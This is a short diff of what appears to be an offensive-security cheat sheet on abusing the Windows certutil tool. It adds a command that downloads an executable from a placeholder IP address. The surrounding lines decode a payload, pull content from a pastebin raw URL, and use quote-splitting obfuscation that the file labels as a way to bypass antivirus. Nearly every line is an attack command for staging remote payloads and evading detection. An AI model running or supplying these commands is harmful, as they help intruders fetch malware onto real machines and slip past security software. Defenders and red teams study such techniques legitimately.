@@ -7,6 +7,9 @@ certutil -decode payload.txt payload.bin
 # Urlcache download strings from raw http/https
 certutil -f -urlcache https://pastebin.com/raw/foo123 %temp%\foo.txt
 
+#To download exe file
+certutil -urlcache -split -f http://x.x.x.x:8000/file.exe file.exe
+
 # To bypass AV while download strings via urlcache
 certutil -f -ur""""lc""""ache h""""t""""t""""ps:/""""/pastebin.com/raw/foo123 %temp%\foo.txt
 
